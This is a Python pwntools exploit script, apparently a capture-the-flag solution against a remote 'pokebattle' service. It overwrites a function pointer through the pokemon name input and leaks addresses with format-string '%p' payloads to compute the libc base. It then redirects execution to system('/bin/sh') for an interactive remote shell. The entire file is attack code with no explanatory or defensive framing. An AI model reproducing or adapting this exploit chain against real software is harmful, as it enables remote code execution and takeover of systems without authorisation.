from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./pokebattle"
HOST = "114.177.250.4"
PORT = 2225

# if len(sys.argv) > 1 and sys.argv[1] == 'r':
# 	conn = remote(HOST, PORT)
# else:
# 	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_printf = elf.plt["printf"]

libc = ELF('./libc.so.6')
off_system = libc.symbols["system"]
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
off_mypokemons = 0x204040
off_hoge = 0x7ffff7dd18c0 - 0x7ffff79e4000
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def fight(conn):
	conn.sendlineafter("> ", "1")

def pokeball(conn, slot, name):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter("slot : \n", str(slot))
	conn.sendafter("name : \n", name)

def showlist(conn, index):
	conn.sendlineafter("> ", "4")
	conn.sendlineafter("mon : \n", str(index))

def exploit():
	while True:
 		conn = remote(HOST, PORT)
		func_off = 0x28
		payload = "%p,"*10
		payload += "A"*(func_off - len(payload))
		payload += p32(plt_printf)[:-2]
		pokeball(conn, 0, payload)
		try:
			fight(conn)
			r = conn.recvline_contains("0x", timeout=1)
			print r
			if r:
				break
		except EOFError:
			conn.close()
	
	payload = "%p"
	payload += "A"*(func_off - len(payload))
	payload += p32(plt_printf)[:-2]
	pokeball(conn, 2, payload)
	showlist(conn, 2)
	fight(conn)
	libc_hoge = int(conn.recvuntil("A")[:-1], 16)
	libc_base = libc_hoge - off_hoge
	one_gadget = libc_base + gadget[2]
	libc_system = libc_base + off_system	
	payload = "/bin/sh\x00"
	payload += "A"*(func_off - len(payload))
	payload += p64(libc_system)
	pokeball(conn, 3, payload)
	showlist(conn, 3)
	fight(conn)
	print hex(libc_base)	
	conn.interactive()

if __name__ == "__main__":
	exploit()	
